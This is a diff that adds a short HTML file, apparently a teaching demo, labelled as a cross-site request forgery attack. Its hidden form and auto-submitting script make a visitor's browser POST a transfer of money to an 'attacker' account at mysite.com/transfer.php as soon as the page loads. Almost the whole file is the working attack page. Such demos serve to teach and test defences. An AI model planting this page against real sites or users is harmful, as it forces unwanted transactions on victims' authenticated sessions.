@@ -1,0 +1,16 @@
+<!-- malicious.html -->
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>CSRF Attack Demo</h1>
+  <form id="csrf-form" action="http://mysite.com/transfer.php" method="POST">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="50">
+    <button type="submit" name="transfer" value="transfer">
+  </form>
+  <script type="text/javascript">
+    // Submit the form automatically on page load
+    document.getElementById("csrf-form").submit();
+  </script>
+</body>
+</html>
